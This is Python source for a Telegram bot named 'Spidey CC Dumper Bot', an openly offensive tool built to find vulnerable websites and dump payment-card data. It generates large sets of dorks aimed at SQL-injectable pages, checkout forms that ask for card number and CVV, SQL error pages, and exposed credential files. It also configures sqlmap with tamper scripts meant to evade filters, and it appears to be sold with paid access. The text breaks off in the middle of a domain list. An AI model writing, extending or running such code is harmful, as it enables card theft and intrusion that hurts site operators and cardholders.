"""Spidey CC Dumper Bot v2.0 — Sam's Build"""
import os, io, json, time, asyncio, itertools, random, re, shutil, string, sys, tempfile, logging, zipfile, csv, base64, subprocess, concurrent.futures, threading as _threading
from datetime import datetime, timedelta
from pathlib import Path
from typing import List, Set, Dict, Optional, Callable
from urllib.parse import urlparse, parse_qs, parse_qsl, urlencode, urlunparse, quote_plus, unquote
import aiohttp
from bs4 import BeautifulSoup
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (Application, CommandHandler, MessageHandler,
                          CallbackQueryHandler, ContextTypes, ConversationHandler, filters)
from telegram.constants import ParseMode
from telegram.request import HTTPXRequest

try:
    from ddgs import DDGS
    DDGS_AVAILABLE = True
except ImportError:
    try:
        from duckduckgo_search import DDGS
        DDGS_AVAILABLE = True
    except ImportError:
        DDGS_AVAILABLE = False

try:
    from aiohttp_socks import ProxyConnector as _ProxyConnector
    _SOCKS_AVAILABLE = True
except ImportError:
    _SOCKS_AVAILABLE = False

try:
    import psutil
    PSUTIL_OK = True
except ImportError:
    PSUTIL_OK = False

logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)
_THREAD_POOL = concurrent.futures.ThreadPoolExecutor(max_workers=32)

# ═══════════════════════════════════════════════════════════════════════════
#  ⚙️  CONFIG — SAM'S KEYS
# ═══════════════════════════════════════════════════════════════════════════
# ═══════════════════════════════════════════════════════════════════════════
#  ⚙️  CONFIG — Railway environment variables se aayega
# ═══════════════════════════════════════════════════════════════════════════
API_ID         = int(os.environ.get("API_ID", 0))
API_HASH       = os.environ.get("API_HASH", "")
BOT_TOKEN      = os.environ.get("BOT_TOKEN", "")
_admin_env     = os.environ.get("ADMIN_IDS", "")
ADMIN_IDS      = [int(x) for x in _admin_env.split(",") if x.strip().isdigit()]
ADMIN_USERNAME = os.environ.get("ADMIN_USERNAME", "@your_username")
TRIAL_MINUTES  = int(os.environ.get("TRIAL_MINUTES", 5))
COUPON_CODE    = os.environ.get("COUPON_CODE", "lol")


DEFAULT_LEVEL     = 3
DEFAULT_RISK      = 2
DEFAULT_TECHNIQUE = "BEUSTQ"
DEFAULT_TAMPER    = "space2comment,between,charencode"
DEFAULT_THREADS   = 10
DEFAULT_TIMEOUT   = 420
DEFAULT_MAX_CONC  = 5

DATA_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "data")
os.makedirs(DATA_DIR, exist_ok=True)
PROXY_FILE = os.path.join(DATA_DIR, "proxies.json")
BAN_FILE   = os.path.join(DATA_DIR, "bans.json")
AUTH_FILE  = os.path.join(DATA_DIR, "auth.json")
USERS_FILE = os.path.join(DATA_DIR, "users.json")

# sqlmap auto-detect
_sqlmap_which = shutil.which("sqlmap")
_sqlmap_local_py  = os.path.join(os.path.dirname(os.path.abspath(__file__)), "sqlmap", "sqlmap.py")
_sqlmap_local_api = os.path.join(os.path.dirname(os.path.abspath(__file__)), "sqlmap", "sqlmapapi.py")

if _sqlmap_which:
    SQLMAP_BIN = _sqlmap_which
elif os.path.isfile(_sqlmap_local_py):
    SQLMAP_BIN = f"{sys.executable} {_sqlmap_local_py}"
else:
    SQLMAP_BIN = "sqlmap"

if shutil.which("sqlmapapi"):
    SQLMAPAPI_BIN = shutil.which("sqlmapapi")
elif os.path.isfile(_sqlmap_local_api):
    SQLMAPAPI_BIN = f"{sys.executable} {_sqlmap_local_api}"
else:
    SQLMAPAPI_BIN = ""

# sqlmap REST API
API_HOST = "127.0.0.1"
API_PORT = 8775
API_BASE = f"http://{API_HOST}:{API_PORT}"
API_TIMEOUT = aiohttp.ClientTimeout(total=10)
_server_proc = None
_server_lock = asyncio.Lock()
_server_ready = False

# ═══════════════════════════════════════════════════════════════════════════
#  📚  GENERATORS
# ═══════════════════════════════════════════════════════════════════════════
PHP_PARAMS = [
    "id","pid","cid","oid","nid","sid","tid","fid","uid","cat","category","type",
    "sub","page","item","product","article","news","post","entry","record","row",
    "order","orderid","order_id","cart","item_id","product_id","invoice","invoice_id",
    "transaction","ref","user","username","userid","user_id","email","account",
    "login","token","key","hash","session","view","show","display","action","method",
    "step","tab","mode","lang","language","locale","region","sort","offset","start",
    "limit","per_page","pager","page_num","q","search","query","keyword","term","s",
    "find","filter","tag","topic","subject","file","filename","path","folder","dir",
    "name","album","gallery","image","img","photo","video","redirect","return","next",
    "url","link","back","from","callback","format","output","download","report","date",
    "year","month","day","district","country","source","src","origin","parent","child",
    "module","plugin","template","theme","skin","layout","config","settings","option",
    "flag","debug","env","code","status","level","grade","rank","score","group",
    "class","section","version","build",
]

COUNTRY_SITES = [
    "site:.br","site:.in","site:.tr","site:.ro","site:.it","site:.pl",
    "site:.ru","site:.ua","site:.gr","site:.mx","site:.ar","site:.co",
    "site:.pe","site:.id","site:.ph","site:.vn","site:.th","site:.my",
    "site:.pk","site:.bd","site:.bg","site:.hu","site:.rs","site:.sk",
    "site:.cz","site:.pt","site:.es","site:.de","site:.fr","site:.nl",
]

CMS_DORKS = {
    "wordpress": [
        'inurl:"/wp-login.php" inurl:.php?id=', 'inurl:"wp-content" inurl:.php?{param}=',
        'inurl:"wp-admin" inurl:.php?{param}=', 'site:*.wordpress.com inurl:.php?{param}=',
        'inurl:"/?p=" inurl:.php ext:php', 'inurl:"/wp-includes/" ext:php inurl:?id=',
        '"Powered by WordPress" inurl:.php?{param}=', 'inurl:"page_id=" ext:php',
        'inurl:"cat=" inurl:"/wordpress/" ext:php',
    ],
    "joomla": [
        'inurl:"option=com_" inurl:.php?{param}=', 'inurl:"index.php?option=com_content"',
        'inurl:"index.php?option=com_users"', '"Powered by Joomla" inurl:.php?id=',
        '"Joomla!" inurl:index.php?{param}=', 'inurl:"com_k2" ext:php',
        'inurl:"/administrator/" inurl:index.php "{kw}"',
        'inurl:"option=com_" inurl:"view=article" inurl:"id="',
        'inurl:"option=com_virtuemart" inurl:"product_id="',
    ],
    "opencart": [
        'inurl:"index.php?route=product" "{kw}"', 'inurl:"index.php?route=checkout" "{kw}"',
        'inurl:"route=account/login" "{kw}"', '"Powered by OpenCart" inurl:.php?product_id=',
        'inurl:"index.php?route=product/product&product_id="',
        'inurl:"/index.php?route=common/home" "{kw}"', '"OpenCart" inurl:"&category_id=" ext:php',
    ],
    "prestashop": [
        '"PrestaShop" inurl:index.php?id_product= "{kw}"', 'inurl:"index.php?id_category=" site:com "{kw}"',
        '"PrestaShop" inurl:checkout "{kw}"', 'inurl:"/index.php?controller=" inurl:"prestashop"',
        '"Powered by PrestaShop" inurl:.php?{param}=', 'inurl:"index.php?id_product=" "{kw}"',
        'inurl:"index.php?id_order=" "{kw}"', 'inurl:"index.php?controller=order&step=" "{kw}"',
    ],
    "magento": [
        'inurl:"/checkout/cart/" "{kw}"', 'inurl:"/checkout/onepage/" "{kw}"',
        '"Magento" inurl:.php?id= "{kw}"', '"Powered by Magento" inurl:checkout',
        'inurl:"/catalog/product/view/id/"', 'inurl:"/index.php/checkout/" "{kw}"',
        '"Magento Commerce" inurl:.php?{param}=', 'inurl:"/customer/account/login/" "{kw}"',
        'inurl:"/sales/order/view/order_id/" "{kw}"',
    ],
    "drupal": [
        'inurl:"?q=node/" "{kw}"', 'inurl:"?q=user/login" "{kw}"',
        '"Powered by Drupal" inurl:.php?{param}=', 'inurl:"/node/" inurl:"?{param}=" site:com',
        '"X-Generator: Drupal" inurl:.php?id=', 'inurl:"?q=content/" "{kw}" ext:php',
    ],
    "laravel": [
        'inurl:"/api/" inurl:".php?id=" "{kw}"', 'intext:"Laravel" inurl:.php?{param}= "{kw}"',
        'inurl:"/public/" inurl:.php?{param}=', '"laravel" inurl:?{param}= site:com',
    ],
    "codeigniter": [
        'inurl:"/index.php/{param}/" "{kw}"', '"CodeIgniter" inurl:.php?{param}=',
        'inurl:"/index.php/user/login" "{kw}"', '"CodeIgniter" inurl:checkout "{kw}"',
    ],
}

DORK_TEMPLATES = [
    # ── SQLi injectable PHP pages ──
    '{kw} *login inurl:.php?{param}=','{kw} login inurl:.php?{param}=',
    '{kw} login inurl:index.php?{param}=','{kw} login inurl:page.php?{param}=',
    '{kw} login inurl:view.php?{param}=','"{kw}" ext:php inurl:?{param}=',
    '"{kw}" ext:php inurl:.php?{param}=','ext:php inurl:?{param}= "{kw}"',
    '{kw} ext:php inurl:{param}=','{kw} ext:php inurl:id=',
    '{kw} ext:php inurl:page=','{kw} ext:php inurl:view=',
    '{kw} ext:php inurl:cat=','{kw} ext:php inurl:type=',
    'inurl:.php?{param}= "{kw}"','inurl:.php?{param}= {kw}',
    'inurl:.php?id= "{kw}"','inurl:.php?id= {kw} site:com',
    '"{kw}" inurl:.php?{param}= site:.com','{kw} inurl:.php?{param}= ext:php',
    '"{kw}" inurl:?{param}=','{kw} site:com inurl:.php?{param}=',
    # ── Specific PHP pages ──
    '"{kw}" inurl:view.php?id=','"{kw}" inurl:index.php?id=',
    '"{kw}" inurl:page.php?id=','"{kw}" inurl:item.php?id=',
    '"{kw}" inurl:news.php?id=','"{kw}" inurl:article.php?id=',
    '"{kw}" inurl:post.php?id=','"{kw}" inurl:read.php?id=',
    '"{kw}" inurl:detail.php?id=','"{kw}" inurl:show.php?id=',
    '"{kw}" inurl:category.php?id=','"{kw}" inurl:product.php?id=',
    '"{kw}" inurl:products.php?id=','"{kw}" inurl:search.php?{param}=',
    '"{kw}" inurl:gallery.php?id=','"{kw}" inurl:download.php?id=',
    # ── E-commerce / CC ──
    '"{kw}" inurl:checkout.php?id=','"{kw}" inurl:payment.php?id=',
    '"{kw}" inurl:billing.php?id=','"{kw}" inurl:invoice.php?id=',
    '"{kw}" inurl:order.php?id=','"{kw}" inurl:cart.php?id=',
    'inurl:checkout.php intext:"card number" "{kw}"',
    'inurl:payment.php intext:"credit card" "{kw}"',
    'intext:"card number" intext:"expiry" inurl:.php?{param}=',
    'intext:"credit card number" inurl:checkout ext:php',
    'intext:"cvv" intext:"card number" inurl:.php?{param}=',
    'intext:"visa" intext:"mastercard" inurl:checkout.php',
    'intext:"stripe" inurl:checkout.php ext:php',
    'intext:"paypal" intext:"card" inurl:checkout.php',
    'inurl:checkout.aspx intext:"card number"',
    'inurl:payment.aspx intext:"credit card" "{kw}"',
    # ── Login/admin ──
    '"{kw}" inurl:login.php?{param}=','"{kw}" inurl:admin.php?{param}=',
    '"{kw}" inurl:user.php?{param}=','"{kw}" inurl:member.php?{param}=',
    '"{kw}" inurl:profile.php?{param}=','"{kw}" inurl:dashboard.php?{param}=',
    'intitle:"admin login" inurl:.php?{param}=','intitle:"login" inurl:admin.php "{kw}"',
    'intitle:"administrator" inurl:.php?{param}= "{kw}"',
    'inurl:"/admin/" inurl:.php?{param}= "{kw}"',
    'inurl:"/administrator/" inurl:.php?id=','inurl:"/manage/" inurl:.php?id= "{kw}"',
    'intext:"username" intext:"password" inurl:login.php?{param}=',
    # ── ASPX / ASP / JSP / CFM ──
    '"{kw}" inurl:.aspx?{param}=','{kw} inurl:.aspx?id=',
    '{kw} ext:aspx inurl:?{param}=','"{kw}" inurl:checkout.aspx',
    '"{kw}" inurl:payment.aspx?{param}=','"{kw}" inurl:product.aspx?id=',
    '"{kw}" inurl:default.aspx?{param}=','{kw} inurl:.asp?{param}=',
    '{kw} inurl:.asp?id=','"{kw}" inurl:.jsp?{param}=',
    '{kw} inurl:.jsp?id=','{kw} inurl:.cfm?{param}=',
    # ── SQL error dorks ──
    'intext:"mysql_fetch_array()" inurl:.php?{param}=',
    'intext:"mysql_num_rows()" inurl:.php?{param}=',
    'intext:"You have an error in your SQL syntax" inurl:.php',
    'intext:"Warning: mysql_" inurl:.php?{param}=',
    'intext:"supplied argument is not a valid MySQL" inurl:.php',
    'intext:"ORA-01756:" inurl:.php','intext:"ORA-00933:" inurl:.php',
    'intext:"Microsoft OLE DB Provider for SQL Server" inurl:.asp',
    'intext:"ODBC SQL Server Driver" inurl:.asp','intext:"Incorrect syntax near" inurl:.asp',
    'intext:"Unclosed quotation mark before the character string" inurl:.asp',
    'intext:"mysqli_fetch_" inurl:.php?{param}=',
    'intext:"pg_query()" inurl:.php?{param}=',
    'intext:"PDOException:" inurl:.php?{param}=',
    'intext:"SQLSTATE[" inurl:.php?{param}=',
    'intext:"SQL command not properly ended" inurl:.php',
    # ── Exposed files ──
    'filetype:sql intext:"INSERT INTO" "{kw}"',
    'filetype:sql intext:"CREATE TABLE" intext:"password"',
    'filetype:log intext:"password" intext:"username" "{kw}"',
    'filetype:env intext:"DB_PASSWORD" "{kw}"',
    'filetype:yml intext:"password" "{kw}"','filetype:xml intext:"password" "{kw}"',
    'filetype:ini intext:"passwd" "{kw}"','filetype:conf intext:"password" "{kw}"',
    'filetype:bak inurl:backup "{kw}"','filetype:json intext:"api_key" "{kw}"',
    'filetype:txt intext:"username" intext:"password" "{kw}"',
    'filetype:csv intext:"credit card" "{kw}"','filetype:xls intext:"password" intext:"email" "{kw}"',
    'filetype:pem intext:"PRIVATE KEY"','inurl:"/.env" intext:"DB_PASSWORD"',
    'inurl:"/config.php" intext:"$db_pass"','inurl:"/database.yml" intext:"password"',
    'inurl:"/phpMyAdmin" intitle:"phpMyAdmin"','inurl:"/phpmyadmin/" intitle:"phpMyAdmin"',
    'inurl:"db.php" intext:"mysql_connect"','inurl:"wp-config.php" intext:"DB_PASSWORD"',
    'inurl:"settings.php" intext:"database_password"',
    # ── Directory listing ──
    'intitle:"Index of" intext:"backup" "{kw}"',
    'intitle:"Index of" intext:".sql" "{kw}"',
    'intitle:"Index of" intext:"password" "{kw}"',
    'intitle:"Index of" "/admin" "{kw}"',
    'intitle:"Index of" "/database" "{kw}"',
    'intitle:"Index of" intext:"dump.sql"',
    # ── Country ──
    '{kw} inurl:.php?id= site:.br','{kw} inurl:.php?id= site:.in',
    '{kw} inurl:.php?id= site:.tr','{kw} inurl:.php?id= site:.ro',
    '{kw} inurl:.php?id= site:.it','{kw} inurl:.php?id= site:.pl',
    '{kw} inurl:.php?{param}= site:.ru','{kw} inurl:.php?{param}= site:.ua',
    '{kw} inurl:.php?{param}= site:.gr','{kw} inurl:.php?{param}= site:.mx',
    '{kw} inurl:.php?{param}= site:.ar','{kw} inurl:.php?{param}= site:.id',
    '{kw} inurl:.php?{param}= site:.ph','{kw} inurl:.php?{param}= site:.vn',
    'ext:php inurl:?{param}= "{kw}" site:.com','ext:php inurl:?{param}= "{kw}" site:.net',
    'ext:php inurl:?{param}= "{kw}" site:.org',
    # ── Multi-param ──
    '{kw} inurl:.php?id=1&cat=','{kw} inurl:.php?{param}=1&id=',
    'inurl:.php?id=&cat= "{kw}" ext:php','inurl:.php?page=&id= "{kw}"',
    'inurl:.php?{param}=&action= "{kw}"','inurl:.php?item=&id= "{kw}" ext:php',
    '~{kw} ext:php inurl:?{param}= site:com',
]

PAYMENT_KEYWORD_TEMPLATES = [
    "credit card checkout","debit card payment","visa mastercard checkout",
    "online payment form","secure checkout page","card payment gateway",
    "credit card billing","debit card billing","card number entry",
    "payment processing site","credit card subscription","card details form",
    "buy with credit card","checkout credit card","payment credit card form",
    "online store checkout","ecommerce payment page","card accepted checkout",
    "visa payment form","mastercard payment form","amex payment checkout",
    "stripe payment form","paypal checkout credit card","square payment form",
    "credit card order form","debit card order form","card billing form",
    "secure payment page","enter card details","credit card number form",
    "cvv card checkout","card expiry billing","online shopping checkout",
    "payment gateway form","shop checkout credit card","store payment form",
    "buy now credit card","add card payment","card holder billing",
    "subscription credit card","membership credit card payment",
    "donate credit card","fund credit card checkout","renew card billing",
    "upgrade credit card payment","purchase credit card form",
    "woocommerce credit card","shopify checkout card","magento payment card",
    "opencart credit card","prestashop checkout card","bigcommerce card",
    "credit card form php","payment form php checkout","billing php card",
    "checkout php visa mastercard","order php credit card",
]

KEYWORD_TEMPLATES = [
    "plans","issue report","api pricing","emulator not","to fix","failed",
    "error codes","issue today","cheapest plan","failed process","recording failed",
    "not connecting","common problem","booking price","appointment system",
    "traveller review","login","method without","game not","cancel","auth fail",
    "windows","plan","streaming issues","what fees","account","pricing for",
    "loading packages","price meaning","include taxes","month","pricing uk",
    "cheapest plans","hacked recovery","price canada","personal bookings",
    "tv remote","additional member","recovery email","payment method",
    "internet reddit","fix app","reviews","password login","student plans",
    "buffering","black screen","policy for","free trial","month plans",
    "basic plan","password","login portal","monthly membership","with vpn",
    "issue 2024","store page","fix buffering","problem series","to uninstall",
    "price uk","solve problem","failed attempting","admin","add people",
    "subscription","portal login","is stuck","issues signing","plans 2024",
    "to find","why not","why keeps","to open","fix problem","error code",
    "update price","refund","free download","billing online","fixed",
    "seller commission","comparison","plan deals","number not","channels",
    "registration not","checkout error","payment declined","billing failed",
    "subscription error","account suspended","login failed","verification failed",
    "transaction failed","order failed","payment not processed","card declined",
    "refund status","order cancelled","account hacked","password reset",
    "2fa problem","otp not received","account recovery","unable to pay",
    "payment gateway error","checkout problem","card not accepted",
    "payment processing","invoice download","subscription renewal",
    "auto renewal","membership expired","upgrade plan","downgrade plan",
    "billing cycle","payment history","transaction history","billing address",
] + PAYMENT_KEYWORD_TEMPLATES

BANKING_KEYWORDS = [
    "online banking login","bank account statement","transaction history",
    "wire transfer form","ach payment","direct deposit setup","bank routing number",
    "account number entry","checking account balance","savings account details",
    "credit card statement","loan payment portal","mortgage payment",
    "auto loan payment","business banking login","corporate account access",
    "bank verification","identity verification","security question reset",
    "fraud alert report","account lockout","password change banking",
]

INSURANCE_KEYWORDS = [
    "insurance claim form","policy number entry","insurance quote",
    "auto insurance claim","health insurance claim","life insurance policy",
    "home insurance claim","renters insurance","liability coverage",
    "insurance payment portal","premium payment","renewal notice",
    "policy cancellation","claim status check","insured person details",
    "beneficiary change","coverage verification","insurance card download",
]

HEALTHCARE_KEYWORDS = [
    "patient portal login","medical billing statement","healthcare invoice",
    "insurance verification","copay payment","deductible status","prescription refill",
    "medication history","appointment scheduling","telehealth consult",
    "medical records request","test results download","healthcare account",
    "payment plan setup","financial assistance application","medical ID card",
    "explanation of benefits","claim denial appeal","preauthorization",
]

TRAVEL_KEYWORDS = [
    "flight booking confirmation","hotel reservation","car rental booking",
    "vacation package checkout","travel insurance purchase","itinerary download",
    "boarding pass retrieval","seat selection","upgrade request",
    "loyalty points redemption","travel voucher","group booking",
    "corporate travel account","expense report","travel invoice",
    "visa application","passport details","customs declaration",
]

EDUCATION_KEYWORDS = [
    "student login portal","tuition payment","financial aid application",
    "scholarship application","student account balance","course registration",
    "grade transcript download","enrollment verification","class schedule",
    "exam results access","homework submission","assignment grades",
    "library account","student ID card","campus parking permit",
    "meal plan payment","housing application",
]

SENSITIVE_GENERAL = [
    "account takeover","password reset link","two factor authentication",
    "security code entry","SSN entry","tax ID","driver license number",
    "passport number","mother maiden name","birthdate verification",
    "address proof","utility bill upload","bank statement upload",
    "API key generation","secret key","client secret","OAuth token",
    "session cookie","JWT token","refresh token","private key",
]

def generate_keywords(seed_brands: list, count_per_brand: int) -> list:
    results = set()
    templates = KEYWORD_TEMPLATES.copy()
    random.shuffle(templates)
    all_seeds = list(dict.fromkeys([b.strip().lower() for b in seed_brands if b.strip()] + PAYMENT_KEYWORD_TEMPLATES))
    for brand in all_seeds:
        for tmpl in templates:
            results.add(f"{brand} {tmpl}")
            results.add(f"{tmpl} {brand}")
    for pt in PAYMENT_KEYWORD_TEMPLATES:
        results.add(pt)
        for brand in [b.strip().lower() for b in seed_brands if b.strip()]:
            results.add(f"{brand} {pt}")
    for t in templates:
        results.add(t)
    out = list(results)
    random.shuffle(out)
    return out

def generate_dorks(keywords: list, limit: int = 1_000_000) -> list:
    results = []
    templates = DORK_TEMPLATES.copy()
    params = PHP_PARAMS.copy()
    random.shuffle(templates); random.shuffle(params)
    kw_pool = keywords.copy(); random.shuffle(kw_pool)
    tc = itertools.cycle(templates); pc = itertools.cycle(params)
    i = 0
    while len(results) < limit:
        t = next(tc); p = next(pc); kw = kw_pool[i % len(kw_pool)]; i += 1
        results.append(t.replace("{kw}", kw).replace("{param}", p))
        if len(results) >= limit: break
    random.shuffle(results)
    return results

def generate_hq_sqli_dorks(keywords=None, limit=10_000, include_error_dorks=True,
                            include_payment_dorks=True, include_cms_dorks=True,
                            include_country_dorks=True, target_countries=None,
                            target_cms=None) -> list:
    if keywords is None: keywords = ["shop","store","checkout","payment","login","account"]
    if target_countries is None: target_countries = COUNTRY_SITES[:15]
    if target_cms is None: target_cms = list(CMS_DORKS.keys())
    results = set()
    params = PHP_PARAMS[:30]; random.shuffle(params)
    pc = itertools.cycle(params)
    kw_pool = keywords.copy(); random.shuffle(kw_pool)
    # Core SQLi patterns
    for kw in kw_pool:
        for pat in [
            'inurl:.php?id= "{kw}"','inurl:.php?cat= "{kw}"','inurl:.php?pid= "{kw}"',
            'inurl:.php?article= "{kw}"','inurl:.php?{param}= "{kw}" ext:php',
            'inurl:.php?{param}= site:com','inurl:.php?{param}= site:net',
            'inurl:index.php?id= "{kw}"','inurl:view.php?id= "{kw}"',
            'inurl:page.php?id= "{kw}"','inurl:detail.php?id= "{kw}"',
            'inurl:item.php?id= "{kw}"','inurl:news.php?id= "{kw}"',
            'inurl:product.php?id= "{kw}"','inurl:category.php?id= "{kw}"',
            'inurl:search.php?{param}= "{kw}"','inurl:.aspx?id= "{kw}"',
            'inurl:.asp?id= "{kw}"','inurl:.jsp?id= "{kw}"',
        ]:
            results.add(pat.replace("{kw}", kw).replace("{param}", next(pc)))
    if include_error_dorks:
        for pat in [
            'intext:"mysql_fetch_array()" inurl:.php?{param}=',
            'intext:"You have an error in your SQL syntax" inurl:.php?{param}=',
            'intext:"Warning: mysql_" inurl:.php?{param}=',
            'intext:"supplied argument is not a valid MySQL" inurl:.php',
            'intext:"mysqli_fetch_" inurl:.php?{param}=',
            'intext:"PDOException:" inurl:.php?{param}=',
            'intext:"SQLSTATE[" inurl:.php?{param}=',
            'intext:"Microsoft OLE DB Provider for SQL Server" inurl:.asp',
            'intext:"ORA-01756:" inurl:.php','intext:"Incorrect syntax near" inurl:.asp?{param}=',
        ]:
            for _ in range(5): results.add(pat.replace("{param}", next(pc)))
    if include_payment_dorks:
        for kw in kw_pool[:20]:
            for pat in [
                'inurl:checkout.php intext:"credit card" ext:php',
                'inurl:payment.php intext:"card number" ext:php',
                'inurl:billing.php intext:"card number" ext:php',
                'intext:"cvv" intext:"card number" inurl:.php?id=',
                'intext:"credit card" intext:"expiry" inurl:.php?{param}=',
                'intext:"visa" intext:"mastercard" inurl:checkout.php',
                'intext:"stripe" inurl:checkout.php ext:php',
                '"{kw}" inurl:checkout.php?id=','"{kw}" inurl:payment.php?id=',
            ]:
                results.add(pat.replace("{kw}", kw).replace("{param}", next(pc)))
    if include_cms_dorks:
        for cms in target_cms:
            if cms in CMS_DORKS:
                for kw in kw_pool[:10]:
                    for pat in CMS_DORKS[cms]:
                        results.add(pat.replace("{kw}", kw).replace("{param}", next(pc)))
    if include_country_dorks:
        for c in target_countries:
            for kw in kw_pool[:10]:
                results.add(f'"{kw}" inurl:.php?id= {c}')
                results.add(f'"{kw}" inurl:.php?{random.choice(params)}= {c}')
                results.add(f'"{kw}" ext:php inurl:?id= {c}')
    d = list(results)[:limit]
    random.shuffle(d)
    return d

def generate_country_dorks(keywords, countries=None, limit=5_000) -> list:
    if countries is None: countries = COUNTRY_SITES[:20]
    results = set()
    params = PHP_PARAMS[:20]; random.shuffle(params)
    pc = itertools.cycle(params)
    for c in countries:
        for kw in keywords[:50]:
            results.add(f'"{kw}" inurl:.php?id= {c}')
            results.add(f'"{kw}" inurl:.php?{next(pc)}= {c}')
            results.add(f'"{kw}" ext:php inurl:?id= {c}')
            results.add(f'ext:php inurl:?{next(pc)}= "{kw}" {c}')
            results.add(f'"{kw}" inurl:index.php?id= {c}')
    d = list(results)[:limit]
    random.shuffle(d)
    return d

def generate_cms_dorks(keywords, cms_list=None, limit=5_000) -> list:
    if cms_list is None: cms_list = list(CMS_DORKS.keys())
    results = set()
    params = PHP_PARAMS[:20]; pc = itertools.cycle(params)
    for cms in cms_list:
        if cms not in CMS_DORKS: continue
        for kw in keywords[:30]:
            for pat in CMS_DORKS[cms]:
                results.add(pat.replace("{kw}", kw).replace("{param}", next(pc)))
    d = list(results)[:limit]
    random.shuffle(d)
    return d

def generate_exposed_dorks(keywords, limit=2_000) -> list:
    results = set()
    for kw in keywords[:50]:
        for pat in [
            'filetype:sql intext:"INSERT INTO" "{kw}"','filetype:env intext:"DB_PASSWORD" "{kw}"',
            'filetype:log intext:"password" "{kw}"','filetype:yml intext:"password" "{kw}"',
            'filetype:json intext:"api_key" "{kw}"','filetype:bak inurl:backup "{kw}"',
            'inurl:"/.env" intext:"DB_PASSWORD"','inurl:"/config.php" intext:"$db_pass"',
            'inurl:"/wp-config.php" intext:"DB_PASSWORD"','intitle:"Index of" intext:".sql" "{kw}"',
        ]:
            results.add(pat.replace("{kw}", kw))
    d = list(results)[:limit]
    random.shuffle(d)
    return d

# ═══════════════════════════════════════════════════════════════════════════
#  🌐  URL FINDER (DDGS + 6 Engines)
# ═══════════════════════════════════════════════════════════════════════════
_GLOBAL_CONNECTOR = None

def _get_connector():
    global _GLOBAL_CONNECTOR
    if _GLOBAL_CONNECTOR is None or _GLOBAL_CONNECTOR.closed:
        _GLOBAL_CONNECTOR = aiohttp.TCPConnector(limit=300, limit_per_host=15,
                                                ttl_dns_cache=300, force_close=False,
                                                enable_cleanup_closed=True)
    return _GLOBAL_CONNECTOR

_ddgs_lock = _threading.Lock()
_ddgs_consecutive_empty = 0
_ddgs_cooldown_until = 0.0
_DDGS_EMPTY_THRESHOLD = 10
_DDGS_COOLDOWN_SECS = 45

def _ddgs_record_empty():
    global _ddgs_consecutive_empty, _ddgs_cooldown_until
    with _ddgs_lock:
        _ddgs_consecutive_empty += 1
        if _ddgs_consecutive_empty >= _DDGS_EMPTY_THRESHOLD:
            _ddgs_cooldown_until = time.time() + _DDGS_COOLDOWN_SECS
            _ddgs_consecutive_empty = 0

def _ddgs_record_success():
    global _ddgs_consecutive_empty
    with _ddgs_lock:
        _ddgs_consecutive_empty = 0

def _ddgs_wait_if_coolingdown():
    r = _ddgs_cooldown_until - time.time()
    if r > 0: time.sleep(r + 0.5)

HEADERS_LIST = [
    {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
     "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate",
     "Connection": "keep-alive", "Cache-Control": "no-cache"},
    {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
     "Accept-Language": "en-GB,en;q=0.9", "Accept-Encoding": "gzip, deflate", "Connection": "keep-alive"},
    {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
     "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "keep-alive"},
    {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
     "Accept-Language": "de-DE,de;q=0.9,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "keep-alive"},
    {"User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
     "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate", "Connection": "keep-alive"},
]

BLACKLIST_DOMAINS = {
    "google.com","google.co.uk","google.co.in","googleapis.com","googleusercontent.com",
    "gstatic.com","googlesyndication.com","bing.com","msn.com","yahoo.com","yimg.com",
    "duckduckgo.com","ddg.gg","ask.com","baidu.com","yandex.com","yandex.ru",
    "startpage.com","searxng.org","mojeek.com","facebook.com","fb.com","fbcdn.net",
    "instagram.com","twitter.com","x.com","t.co","tiktok.com","snapchat.com",
    "linkedin.com","pinterest.com","telegram.org","telegram.me","whatsapp.com",
    "discord.com","discord.gg","twitch.tv","reddit.com","redd.it","quora.com",
    "youtube.com","youtu.be","ytimg.com","vimeo.com","doubleclick.net","adnxs.com",
    "googletagmanager.com","scorecardresearch.com","quantserve.com","outbrain.com",
    "taboola.com","cloudflare.com","fastly.net","cdn.jsdelivr.net","cdnjs.cloudflare.com",
    "unpkg.com","jsdelivr.net","bit.ly","tinyurl.com","goo.gl","ow.ly","t.ly","rb.gy",
    "archive.org","web.archive.org","gravatar.com",
    "microsoft.com","office.com","office365.com","live.com","outlook.com","hotmail.com",
    "microsoftonline.com","azure.com","azurewebsites.net","windowsazure.com",
    "sharepoint.com","onedrive.com","skype.com","techcommunity.microsoft.com",
    "gmail.com","drive.google.com","docs.google.com","maps.google.com","play.google.com",
    "amazon.com","amazon.co.uk","amazon.in","amazon.de","amazonaws.com","aws.amazon.com",
    "awsstatic.com","apple.com","icloud.com","itunes.apple.com","apps.apple.com",
    "ebay.com","etsy.com","aliexpress.com","alibaba.com","walmart.com","target.com",
    "bestbuy.com","costco.com","shopify.com","bigcommerce.com","booking.com","expedia.com",
    "airbnb.com","tripadvisor.com","hotels.com","kayak.com","trivago.com","priceline.com",
